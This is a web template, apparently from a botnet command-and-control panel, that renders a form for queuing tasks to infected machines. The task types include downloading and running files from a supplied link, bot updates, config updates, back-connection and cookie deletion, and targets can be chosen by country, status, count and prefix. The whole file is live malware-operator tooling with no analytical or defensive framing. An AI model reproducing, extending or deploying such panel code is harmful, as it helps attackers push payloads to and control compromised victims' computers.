<div id="div_sub_{$rand_name}"></div>
<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.getElementById('div_sub_{$rand_name}').parentNode.id.replace('_content', '');
document.getElementById(id_{$rand_name} + '_title').innerHTML = '{$lang.addcmd}';

function submit_{$rand_name}(){
return get_hax({
	url:'/bots/jobs_add.html?window=1',
	method: document.forms['add_cmd{$rand_name}'].method,
	form: 'add_cmd{$rand_name}',
	id: id_{$rand_name} + '_content',
});
}

</script>
<form action="/bots/jobs_add.html?window=1" name="add_cmd{$rand_name}" id="add_cmd{$rand_name}" enctype="application/x-www-form-urlencoded" method="post">
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp2">
    <th style="text-align: left; width: 300px;">{$lang.cmdtype} (<a onclick="alert('{$lang.vibtyz}');" style="cursor:pointer">?</a>):</th>
    <th style="text-align: left;">
    <select name="type" id="type{$rand_name}" class="user" style="width:90%">
    <option value="download">{$lang.dlolauf}</option>
    <option value="multidownload">{$lang.dlolaufm}</option>
    <option value="update">{$lang.updates}</option>
    <option value="sb">{$lang.sb}</option>
    <option value="bc">{$lang.bc}</option>
    <option value="updateconfig">{$lang.upcfg}</option>
    <option value="deletecookies">{$lang.delcoo}</option>
    </select><input type="button" class="user" style="width:10%" value="..." onclick="user_cmd('{$rand_name}');" />
    </th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.country} (<a onclick="alert('{$lang.vsiskbdz}');" style="cursor:pointer">?</a>):</th>
    <th style="text-align: left;">
    <select name="country[]" class="user" style="width:100%; height: 160px;" multiple="multiple">
    <option value="" selected="selected">{$lang.all}</option>
    {foreach from=$country item=c}<option value="{$c->code}">{$country_code[$c->code]}</option>{/foreach}
    </select>
    </th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.status} (<a onclick="alert('{$lang.cvksbdk}');" style="cursor:pointer">?</a>):</th>
    <th style="text-align: left;">
    <select name="status" class="user" style="width:100%">
    <option value="3">{$lang.cnb}</option>
    <option value="2">{$lang.czb}</option>
    <option value="1" selected="selected">{$lang.alls}</option>
    </select>
    </th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.ogpk} (<a onclick="alert('{$lang.cvkddkpk}');" style="cursor:pointer">?</a>):</th>
    <th style="text-align: left;"><input type="text" name="limit" class="user" style="width:100%" value="0" /></th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.cogdz} (<a onclick="alert('{$lang.cdoldzeo}');" style="cursor:pointer">?</a>):</th>
    <th style="text-align: left;">
    <select name="limit_task" class="user" style="width:100%">
    <option value="2">{$lang.yes}</option>
    <option value="1" selected="selected">{$lang.no}</option>
    </select>
    </th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.pref} (<a onclick="alert('{$lang.cvoinp}');" style="cursor:pointer">?</a>):</th>
    <th style="text-align: left;">
    <select name="prefix[]" class="user" style="width:100%; height: 140px;" multiple="multiple">
    {if $_SESSION.user->config.prefix eq ''}
    <option value="" selected="selected">{$lang.all}</option>
    {foreach from=$prefix item=p}<option value="{$p}">{$p}</option>{/foreach}
    {else}
    <option value="{$_SESSION.user->config.prefix}" selected="selected">{$_SESSION.user->config.prefix}</option>
    {/if}
    </select>
    </th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.clinks} (<a onclick="alert('{$lang.napsil}');" style="cursor:pointer">?</a>):</th>
    <th style="text-align: left;"><input type="text" name="link" class="user" style="width:100%" value="" /></th>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th colspan="2" style="text-align: left;"><input type="button" name="submit" class="user" style="width:100%" value="{$lang.add}" onclick="submit_{$rand_name}();" /></th>
    </tr>
</table>
</form>